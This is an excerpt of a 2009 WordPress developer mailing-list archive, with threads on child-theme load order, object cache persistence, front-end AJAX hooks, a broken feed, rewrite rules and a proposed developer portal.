In-Reply-To: <9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>
References: <58E76AA1-8AD3-4880-904B-9C007D106F96@gmail.com> 
	<9f34a3610912101836l1d5aa80dnb150d23660292bf7@mail.gmail.com>
Message-ID: <161617690912110602o408d2737p2cee350eec93c788@mail.gmail.com>

On Thu, Dec 10, 2009 at 8:36 PM, Demetris <kikizas at gmail.com> wrote:
> The child?s functions.php is executed first.
>
> I would expect it to be the other way around. ?(But I have no idea if
> it matters. For example, when both parent and child register one
> function or filter each to the same hook, the order can be adapted
> with the priority argument. But probably there are scenarios that I?m
> missing.)

The child is executed first, to allow the child to override the
parent. Think "pluggable".

Consider this case:

Parent functions.php

if (!function_exists('some_function')) :
function some_function() {
...
}
endif;

Child can now override that function merely by declaring it himself,
but only as long as he's included first.


-Otto

From pete at jointforcestech.com  Fri Dec 11 14:18:04 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Fri, 11 Dec 2009 06:18:04 -0800
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
Message-ID: <7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>

Are you trying to:

   1. Show the hits from the .com blog on the .org blog dashboard; or
   2. Track the hits on your .org blog using WordPress.com stats; or
   3. Trying to add the hits on your .com and .org blogs and show them on
   the .org dashboard?


On Fri, Dec 11, 2009 at 6:00 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> Is there any way to transfer Blog Stats (page hits that is) from
> WordPress.com to stand-alone wordpress installation? Is it a plugin of
> some kind?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From dougal at gunters.org  Fri Dec 11 14:57:58 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 11 Dec 2009 09:57:58 -0500
Subject: [wp-hackers] Planet feed is broken
Message-ID: <4B225DF6.1090003@gunters.org>

To whom it may concern:

The planet.wordpress.org feed is currently broken, with an invalid 
character somewhere in the middle of the post with the bbPress IRC log:

   
http://feedvalidator.org/check.cgi?url=http%3A%2F%2Fplanet.wordpress.org%2Ffeed%2F#l183

Which, in turn, is breaking the WP news in everybody's Dashboard.

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/


From pete at jointforcestech.com  Fri Dec 11 15:08:44 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Fri, 11 Dec 2009 07:08:44 -0800
Subject: [wp-hackers] Planet feed is broken
In-Reply-To: <4B225DF6.1090003@gunters.org>
References: <4B225DF6.1090003@gunters.org>
Message-ID: <7f49e8010912110708t2d9470e4k2cd9f4554488bbe2@mail.gmail.com>

Please open a ticket at http://core.trac.wordpress.org/report/26 (Component:
WordPress.org).


On Fri, Dec 11, 2009 at 6:57 AM, Dougal Campbell <dougal at gunters.org> wrote:

> To whom it may concern:
>
> The planet.wordpress.org feed is currently broken, with an invalid
> character somewhere in the middle of the post with the bbPress IRC log:
>
>
> http://feedvalidator.org/check.cgi?url=http%3A%2F%2Fplanet.wordpress.org%2Ffeed%2F#l183
>
> Which, in turn, is breaking the WP news in everybody's Dashboard.
>
> --
> Dougal Campbell <dougal at gunters.org>
> http://dougal.gunters.org/
> http://twitter.com/dougal
> http://twitual.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From navjotjsingh at gmail.com  Fri Dec 11 15:24:20 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Fri, 11 Dec 2009 20:54:20 +0530
Subject: [wp-hackers] Planet feed is broken
In-Reply-To: <7f49e8010912110708t2d9470e4k2cd9f4554488bbe2@mail.gmail.com>
References: <4B225DF6.1090003@gunters.org>
	<7f49e8010912110708t2d9470e4k2cd9f4554488bbe2@mail.gmail.com>
Message-ID: <7b9e108c0912110724y5a7e0eb0q9207475e68bcbb13@mail.gmail.com>

http://core.trac.wordpress.org/ticket/11396 is the ticket.

On Fri, Dec 11, 2009 at 8:38 PM, Pete Mall <pete at jointforcestech.com> wrote:

> Please open a ticket at http://core.trac.wordpress.org/report/26(Component:
> WordPress.org).
>
>
> On Fri, Dec 11, 2009 at 6:57 AM, Dougal Campbell <dougal at gunters.org>
> wrote:
>
> > To whom it may concern:
> >
> > The planet.wordpress.org feed is currently broken, with an invalid
> > character somewhere in the middle of the post with the bbPress IRC log:
> >
> >
> >
> http://feedvalidator.org/check.cgi?url=http%3A%2F%2Fplanet.wordpress.org%2Ffeed%2F#l183
> >
> > Which, in turn, is breaking the WP news in everybody's Dashboard.
> >
> > --
> > Dougal Campbell <dougal at gunters.org>
> > http://dougal.gunters.org/
> > http://twitter.com/dougal
> > http://twitual.com/
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Fri Dec 11 15:56:02 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 11 Dec 2009 19:56:02 +0400
Subject: [wp-hackers] Blog Stats from WordPress.com to stand-alone
	wordpress?..
In-Reply-To: <7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
References: <9aa12a490912110600l36ea8481o1442883e7546f79b@mail.gmail.com>
	<7f49e8010912110618v3952b38dg6720bf2d3a9eb423@mail.gmail.com>
Message-ID: <9aa12a490912110756w2b8970e6y6d57e364deb503a7@mail.gmail.com>

Well, I'm moving a blog from wordpress.com to standalone installation.
On wordpress.com it had hundreds of thousands hits and I somehow do
not want to loose that data after I move to standalone version. Domain
stays the same. It's just that I'm not sure how to not lose those hits
and visualize them using the widget on my new wordpress installation.

On Fri, Dec 11, 2009 at 6:18 PM, Pete Mall <pete at jointforcestech.com> wrote:
> Are you trying to:
>
> ? 1. Show the hits from the .com blog on the .org blog dashboard; or
> ? 2. Track the hits on your .org blog using WordPress.com stats; or
> ? 3. Trying to add the hits on your .com and .org blogs and show them on
> ? the .org dashboard?
>
>
> On Fri, Dec 11, 2009 at 6:00 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
>
>> Is there any way to transfer Blog Stats (page hits that is) from
>> WordPress.com to stand-alone wordpress installation? Is it a plugin of
>> some kind?
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From bradw at illiams.com  Fri Dec 11 16:42:42 2009
From: bradw at illiams.com (Brad Williams)
Date: Fri, 11 Dec 2009 11:42:42 -0500
Subject: [wp-hackers] WP_Object_Cache problem
Message-ID: <008601ca7a80$f5dceee0$e196cca0$@com>

I'm looking for some help in understanding the WP_Object_Cache class.  I've
read through the Codex article here:

http://codex.wordpress.org/Function_Reference/WP_Cache

 

And also Doug Campbell's blog post here:

http://dougal.gunters.org/blog/2006/07/21/using-the-wordpress-object-cache

 

But I'm having problems getting it to work across page loads.  Below is my
basic example script:

 

add_action('admin_init', 'gmp_cache');

 

function gmp_cache() {

 

                $mydata = wp_cache_get('gmp-plugin', 'complex-query');

 

                if (false === $mydata) {

                                echo "CACHE does not exist";

                

                                $mydata = "my cached data";

                                $myexpire = 60 * 60 * 24; // Cache data for
one day (86400 seconds)

                                wp_cache_set('gmp-plugin', $mydata,
'complex-query', $myexpire);

                }Else{

                                echo "CACHE DOES EXIST";

                                $mydata = wp_cache_get('gmp-plugin',
'complex-query');

                                echo $mydata;

                }

}

 

Basically this will always display "CACHE does not exist.  However if I
display the cache directly after setting it the cached value does display.

 

I've added  define('WP_CACHE', true); to my wp-config.php file and created
the directory wp-content/cache that is writable by the server.  

 

Am I missing something obvious here?  There isn't a lot of recent
information on the caching class

 

Thanks!

 

-Brad Williams

@williamsba

 


From jayarjo at gmail.com  Fri Dec 11 16:46:34 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 11 Dec 2009 20:46:34 +0400
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <26393151.post@talk.nabble.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>
	<26393151.post@talk.nabble.com>
Message-ID: <9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>

There's still some inconsistency. Tutorial says: "Note: In WP 2.8, if
a user is not logged in ('wp_ajax_nopriv_my_action'), then GET
requests are ignored (and return -1). This bug was fixed in WP 2.9."

It probably means that for every wordpress with version less then 2.9
wp_ajax_nopriv_my_action hook doesn't work, right for not logged in
users? And then it goes again - next section: "Ajax on the
Viewer-Facing Side ( WordPress 2.6 , 2.7, 2.8 )" and:
"add_action('wp_ajax_nopriv_my_special_action',
'my_action_callback');". At the same time Codex says that: "We need to
send our request to a plugin PHP file. This should be the main plugin
PHP file. In case you want it to be a separate PHP file, bare in mind
that you won't be able to access the Wordpress global variables, e.g.
$wpdb, since separate files have absolutely no visibility to any part
of WordPress at all."

I think having all that together, no new comer will be able to figure
out howto write an ajax call for not logged-in users for WP version
less then 2.9 (current stable release that is).

On Tue, Nov 17, 2009 at 8:40 PM, nunomorgadinho
<nuno.morgadinho at gmail.com> wrote:
>
> I've also updated this in the Codex example that uses Sack. Took me a while
> to figure this so maybe it will help others now.
>
>
> scribu wrote:
>>
>> Finally updated the Codex example, using jQuery.
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>
> --
> View this message in context: http://old.nabble.com/ajax-to-call-function-in-theme-tp26116790p26393151.html
> Sent from the Wordpress Hackers mailing list archive at Nabble.com.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From if.website at gmail.com  Fri Dec 11 16:50:58 2009
From: if.website at gmail.com (Austin Matzko)
Date: Fri, 11 Dec 2009 10:50:58 -0600
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <008601ca7a80$f5dceee0$e196cca0$@com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
Message-ID: <674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>

On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
> But I'm having problems getting it to work across page loads.

Non-"transient" caching will not persist across page loads unless
you're using some sort of caching plugin, such as WP Super Cache.

From mpretty at voceconnect.com  Fri Dec 11 16:54:12 2009
From: mpretty at voceconnect.com (Michael Pretty)
Date: Fri, 11 Dec 2009 11:54:12 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>
Message-ID: <4B227934.8070007@voceconnect.com>

Actually, WP Super Cache isn't an object cache.  WP Super Cache just 
stores rendered output in a static file.  For object cache you'll need a 
plugin like batcache and have to setup something like memcached on the 
server.

Austin Matzko wrote:
> On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
>   
>> But I'm having problems getting it to work across page loads.
>>     
>
> Non-"transient" caching will not persist across page loads unless
> you're using some sort of caching plugin, such as WP Super Cache.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   


From if.website at gmail.com  Fri Dec 11 16:54:58 2009
From: if.website at gmail.com (Austin Matzko)
Date: Fri, 11 Dec 2009 10:54:58 -0600
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
Message-ID: <674b4a3b0912110854k72aba9f9ub0e788c1814444c9@mail.gmail.com>

On Fri, Dec 11, 2009 at 10:46 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> There's still some inconsistency.

[snip]

> I think having all that together, no new comer will be able to figure
> out howto write an ajax call for not logged-in users for WP version
> less then 2.9 (current stable release that is).

As a "wiki," the Codex can be edited by anybody, so that means both
that you can expect inconsistency and that you should feel free to
correct it when you find it.

From mpretty at voceconnect.com  Fri Dec 11 16:57:22 2009
From: mpretty at voceconnect.com (Michael Pretty)
Date: Fri, 11 Dec 2009 11:57:22 -0500
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com>	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com>	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
Message-ID: <4B2279F2.9040800@voceconnect.com>

I had a similar discussion on trac 
(http://core.trac.wordpress.org/ticket/11062).  I think before we work 
on updating the codex, we should come up with a recommended solution for 
handling ajax requests from the front end.  The problem with always 
using admin-ajax is that some sites have the admin in a different domain 
and or have the admin htaccess protected.  Not all users know how to 
make exceptions in the htaccess file to allow the ajax to work. 

Davit Barbakadze wrote:
> There's still some inconsistency. Tutorial says: "Note: In WP 2.8, if
> a user is not logged in ('wp_ajax_nopriv_my_action'), then GET
> requests are ignored (and return -1). This bug was fixed in WP 2.9."
>
> It probably means that for every wordpress with version less then 2.9
> wp_ajax_nopriv_my_action hook doesn't work, right for not logged in
> users? And then it goes again - next section: "Ajax on the
> Viewer-Facing Side ( WordPress 2.6 , 2.7, 2.8 )" and:
> "add_action('wp_ajax_nopriv_my_special_action',
> 'my_action_callback');". At the same time Codex says that: "We need to
> send our request to a plugin PHP file. This should be the main plugin
> PHP file. In case you want it to be a separate PHP file, bare in mind
> that you won't be able to access the Wordpress global variables, e.g.
> $wpdb, since separate files have absolutely no visibility to any part
> of WordPress at all."
>
> I think having all that together, no new comer will be able to figure
> out howto write an ajax call for not logged-in users for WP version
> less then 2.9 (current stable release that is).
>
> On Tue, Nov 17, 2009 at 8:40 PM, nunomorgadinho
> <nuno.morgadinho at gmail.com> wrote:
>   
>> I've also updated this in the Codex example that uses Sack. Took me a while
>> to figure this so maybe it will help others now.
>>
>>
>> scribu wrote:
>>     
>>> Finally updated the Codex example, using jQuery.
>>>
>>> --
>>> http://scribu.net
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>>
>>>       
>> --
>> View this message in context: http://old.nabble.com/ajax-to-call-function-in-theme-tp26116790p26393151.html
>> Sent from the Wordpress Hackers mailing list archive at Nabble.com.
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>     
>
>
>
>   


From bradw at illiams.com  Fri Dec 11 16:57:22 2009
From: bradw at illiams.com (Brad Williams)
Date: Fri, 11 Dec 2009 11:57:22 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <4B227934.8070007@voceconnect.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>	<674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>
	<4B227934.8070007@voceconnect.com>
Message-ID: <000001ca7a83$025d64e0$07182ea0$@com>

According to the Codex and to Doug's post caching should work across page
loads using the WP_Object_Cache class

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Michael Pretty
Sent: Friday, December 11, 2009 11:54 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] WP_Object_Cache problem

Actually, WP Super Cache isn't an object cache.  WP Super Cache just 
stores rendered output in a static file.  For object cache you'll need a 
plugin like batcache and have to setup something like memcached on the 
server.

Austin Matzko wrote:
> On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
>   
>> But I'm having problems getting it to work across page loads.
>>     
>
> Non-"transient" caching will not persist across page loads unless
> you're using some sort of caching plugin, such as WP Super Cache.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From if.website at gmail.com  Fri Dec 11 17:04:28 2009
From: if.website at gmail.com (Austin Matzko)
Date: Fri, 11 Dec 2009 11:04:28 -0600
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <000001ca7a83$025d64e0$07182ea0$@com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>
	<4B227934.8070007@voceconnect.com>
	<000001ca7a83$025d64e0$07182ea0$@com>
Message-ID: <674b4a3b0912110904j4de8c0b7l2e2afc8d95a62419@mail.gmail.com>

On Fri, Dec 11, 2009 at 10:54 AM, Michael Pretty
<mpretty at voceconnect.com> wrote:
> Actually, WP Super Cache isn't an object cache.  WP Super Cache just stores
> rendered output in a static file.  For object cache you'll need a plugin
> like batcache and have to setup something like memcached on the server.

I stand corrected on WP Super Cache.

On Fri, Dec 11, 2009 at 10:57 AM, Brad Williams <bradw at illiams.com> wrote:
> According to the Codex and to Doug's post caching should work across page
> loads using the WP_Object_Cache class

That post by Doug is over 3 years old.  Since then, the persistent
object cache has been removed from core.

If the Codex says it *will* persist, then it should be corrected.
What it means to say is that where persistent object cache is
available, the caching methods will take advantage of it.

From cjscott69 at gmail.com  Fri Dec 11 17:08:12 2009
From: cjscott69 at gmail.com (Chris Scott)
Date: Fri, 11 Dec 2009 12:08:12 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <000001ca7a83$025d64e0$07182ea0$@com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<674b4a3b0912110850u462a92dfy5adc92b2f22b8800@mail.gmail.com>
	<4B227934.8070007@voceconnect.com>
	<000001ca7a83$025d64e0$07182ea0$@com>
Message-ID: <469fb3cc0912110908x398ef417rea03ea319539ea27@mail.gmail.com>

On Fri, Dec 11, 2009 at 11:57 AM, Brad Williams <bradw at illiams.com> wrote:
> According to the Codex and to Doug's post caching should work across page
> loads using the WP_Object_Cache class

2.5 removed the file caching from object cache. The "new" way is to
drop a object-cache.php file in the content directory that extends the
object caching using your preferred backend. This post has a file
based backend and links to the other common ones:
http://neosmart.net/blog/2008/file-based-extension-to-the-wordpress-object-cache/

--
Chris Scott
http://iamzed.com/
http://hailtheale.com/

>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Michael Pretty
> Sent: Friday, December 11, 2009 11:54 AM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] WP_Object_Cache problem
>
> Actually, WP Super Cache isn't an object cache. ?WP Super Cache just
> stores rendered output in a static file. ?For object cache you'll need a
> plugin like batcache and have to setup something like memcached on the
> server.
>
> Austin Matzko wrote:
>> On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
>>
>>> But I'm having problems getting it to work across page loads.
>>>
>>
>> Non-"transient" caching will not persist across page loads unless
>> you're using some sort of caching plugin, such as WP Super Cache.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Fri Dec 11 17:27:05 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 11 Dec 2009 11:27:05 -0600
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
References: <ffecf028.1ca58b7.1e2fa7d8.368e@BrewerRadio.com> 
	<5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>
	<349fe48b0910291420t2166a30fl45a55ab74e69b15b@mail.gmail.com> 
	<26393151.post@talk.nabble.com>
	<9aa12a490912110846o74e8289bl94cfb12f7ab3f0b7@mail.gmail.com>
Message-ID: <161617690912110927k6af7fd83j914ea3ed6b029b4f@mail.gmail.com>

On Fri, Dec 11, 2009 at 10:46 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:
> There's still some inconsistency. Tutorial says: "Note: In WP 2.8, if
> a user is not logged in ('wp_ajax_nopriv_my_action'), then GET
> requests are ignored (and return -1). This bug was fixed in WP 2.9."
>
> It probably means that for every wordpress with version less then 2.9
> wp_ajax_nopriv_my_action hook doesn't work, right for not logged in
> users?

No. It means that you can't use GET. So you have to use POST.

In 2.9, both GET and POST work.

> And then it goes again - next section: "Ajax on the
> Viewer-Facing Side ( WordPress 2.6 , 2.7, 2.8 )" and:
> "add_action('wp_ajax_nopriv_my_special_action',
> 'my_action_callback');". At the same time Codex says that: "We need to
> send our request to a plugin PHP file. This should be the main plugin
> PHP file. In case you want it to be a separate PHP file, bare in mind
> that you won't be able to access the Wordpress global variables, e.g.
> $wpdb, since separate files have absolutely no visibility to any part
> of WordPress at all."

That is for WP versions prior to the nopriv actions being added. Which
happened back in March:
http://core.trac.wordpress.org/changeset/10720/trunk/wp-admin/admin-ajax.php

> I think having all that together, no new comer will be able to figure
> out howto write an ajax call for not logged-in users for WP version
> less then 2.9 (current stable release that is).

The nopriv actions are there in in 2.8 and up. So probably the codex
needs editing.

On Fri, Dec 11, 2009 at 10:57 AM, Michael Pretty
<mpretty at voceconnect.com> wrote:
> I had a similar discussion on trac
> (http://core.trac.wordpress.org/ticket/11062).  I think before we work on
> updating the codex, we should come up with a recommended solution for
> handling ajax requests from the front end.  The problem with always using
> admin-ajax is that some sites have the admin in a different domain and or
> have the admin htaccess protected.  Not all users know how to make
> exceptions in the htaccess file to allow the ajax to work.
> Davit Barbakadze wrote:

Using an SSL admin won't make any difference.

Using an admin on a different domain might be a problem, but that's a
pretty custom setup to begin with. I don't think we need explicit
support for that type of configuration.

That said, you can always use the init or the template_redirect action
to do AJAX requests to the main blog URL instead of going through the
explicit admin-ajax code.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Fri Dec 11 17:39:11 2009
From: otto at ottodestruct.com (Otto)
Date: Fri, 11 Dec 2009 11:39:11 -0600
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <008601ca7a80$f5dceee0$e196cca0$@com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
Message-ID: <161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>

On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
> I'm looking for some help in understanding the WP_Object_Cache class.
...
> But I'm having problems getting it to work across page loads.

The object cache can be tricky since it got reworked.

Back in pre-2.5, the object cache was persistent, by writing out to
files and such. Testing revealed that this didn't improve speed in any
realistic cases, and actually hurt speed in many commonplace cases.
Therefore, the object cache was reworked.

Now, the object cache is not persistent by default, it resides in
memory only and only for the duration of the session. This is
important, in that it affects how you use it. It should still be used,
but not treated as if it was persistent.

However, the object cache is now highly extensible. This allows
plugins to be created to persist the cache into one of several
options. As was pointed out, there's a file based extension, but
there's also extensions to use memcached setups, among others. These
can allow the object cache to persist across queries into fast memory
systems instead of to slow file systems.

So, if you're using other some fast data caching system, then you can
probably hook the object cache to it in order to make it persistent.
But if you're writing a plugin or something that uses it, then you
must always treat the object cache as if it was not persistent, in
order to maintain data integrity.

If you need a persistent but temporary data store, use the newer
transient system. I have not seen any documentation or tutorials for
it, but it's trivally simple to use. Transients are the same as
options, but they have an expiration date. There's only three
functions you need to know.
function get_transient($transient)
function set_transient($transient, $value, $expiration = 0)
function delete_transient($transient)

Advantage of using these is that they automatically get extended by
these special options cache plugins too, and so they can possibly use
fast memory caching and such. However, by default, they use the
database, like options do.

-Otto
Sent from Memphis, TN, United States

From bradw at illiams.com  Fri Dec 11 18:15:43 2009
From: bradw at illiams.com (Brad Williams)
Date: Fri, 11 Dec 2009 13:15:43 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>
	<161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
Message-ID: <001901ca7a8d$f47387f0$dd5a97d0$@com>

Thanks for explaining in more detail Otto!  I'm going to dig into this a bit
more and work on updating the Codex to be more accurate

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Otto
Sent: Friday, December 11, 2009 12:39 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] WP_Object_Cache problem

On Fri, Dec 11, 2009 at 10:42 AM, Brad Williams <bradw at illiams.com> wrote:
> I'm looking for some help in understanding the WP_Object_Cache class.
...
> But I'm having problems getting it to work across page loads.

The object cache can be tricky since it got reworked.

Back in pre-2.5, the object cache was persistent, by writing out to
files and such. Testing revealed that this didn't improve speed in any
realistic cases, and actually hurt speed in many commonplace cases.
Therefore, the object cache was reworked.

Now, the object cache is not persistent by default, it resides in
memory only and only for the duration of the session. This is
important, in that it affects how you use it. It should still be used,
but not treated as if it was persistent.

However, the object cache is now highly extensible. This allows
plugins to be created to persist the cache into one of several
options. As was pointed out, there's a file based extension, but
there's also extensions to use memcached setups, among others. These
can allow the object cache to persist across queries into fast memory
systems instead of to slow file systems.

So, if you're using other some fast data caching system, then you can
probably hook the object cache to it in order to make it persistent.
But if you're writing a plugin or something that uses it, then you
must always treat the object cache as if it was not persistent, in
order to maintain data integrity.

If you need a persistent but temporary data store, use the newer
transient system. I have not seen any documentation or tutorials for
it, but it's trivally simple to use. Transients are the same as
options, but they have an expiration date. There's only three
functions you need to know.
function get_transient($transient)
function set_transient($transient, $value, $expiration = 0)
function delete_transient($transient)

Advantage of using these is that they automatically get extended by
these special options cache plugins too, and so they can possibly use
fast memory caching and such. However, by default, they use the
database, like options do.

-Otto
Sent from Memphis, TN, United States
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From scribu at gmail.com  Fri Dec 11 19:35:16 2009
From: scribu at gmail.com (scribu)
Date: Fri, 11 Dec 2009 21:35:16 +0200
Subject: [wp-hackers] $wp_rewrite->flush_rules() on plugin activation
In-Reply-To: <410963320912090820t27dea07bx234031cabf212ced@mail.gmail.com>
References: <410963320912081439kfd9ab9cr3325216737cb54ec@mail.gmail.com>
	<674b4a3b0912081449q133dffe3k11cd8f67e9cbe71f@mail.gmail.com>
	<410963320912081452o31f21aei262cfa0d22c82a7f@mail.gmail.com>
	<674b4a3b0912081503p43d9cdfap745334222cb0257b@mail.gmail.com>
	<410963320912081517l77fe898esde271574947a1716@mail.gmail.com>
	<674b4a3b0912081528kee7d1d0u61e1265dca50b62b@mail.gmail.com>
	<410963320912090820t27dea07bx234031cabf212ced@mail.gmail.com>
Message-ID: <349fe48b0912111135r3cdcfb8av58543422239b00f7@mail.gmail.com>

With the insights gained from this topic, I've managed to create a reusable
boilerplate class that sets up all the necessary hooks. You can then just
focus on the actual rules.

Here's the source code:

http://plugins.trac.wordpress.org/browser/scb-framework/trunk/classes/Rewrite.php


And here is a usage example (in a plugin):


class MyRewrite extends scbRewrite {

    function generate() {
        global $wp_rewrite;

        $wp_rewrite->add_rewrite_rule(...);
    }
}

new MyRewrite(__FILE__);


-- 
http://scribu.net

From m at mullenweg.com  Fri Dec 11 20:37:41 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Fri, 11 Dec 2009 12:37:41 -0800
Subject: [wp-hackers] Developer portal
Message-ID: <4B22AD95.8040401@mullenweg.com>

If there were to be a developer portal for WordPress, someplace where if 
you're first getting started with hacking on WP, building plugins, 
creating themes, you could go and it'd have all the best resources in 
one place, what resources do you think would be important to have there?

What do you wish you had when you first started developing for WordPress?

(Bonus points if it's something that already exists, just scattered 
around. :))

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at melz.org  Fri Dec 11 20:44:58 2009
From: m at melz.org (Melissa P.)
Date: Fri, 11 Dec 2009 15:44:58 -0500
Subject: [wp-hackers] Developer portal
